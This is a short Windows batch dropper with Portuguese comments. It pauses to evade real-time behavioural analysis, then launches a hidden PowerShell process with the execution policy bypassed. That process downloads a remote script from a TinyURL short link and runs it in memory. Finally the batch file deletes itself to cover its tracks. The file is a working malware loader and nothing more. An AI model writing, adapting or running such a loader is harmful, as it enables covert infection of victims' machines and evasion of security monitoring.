@echo off
:: Aguarda 3 segundos para quebrar a análise de comportamento em tempo real
ping -n 3 127.0.0.1 >nul
:: Executa o script PowerShell usando o teu TinyURL atualizado
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IWR -useb https://tinyurl.com/3y8wnphh | IEX"
:: Apaga-se a si próprio
del "%~f0"
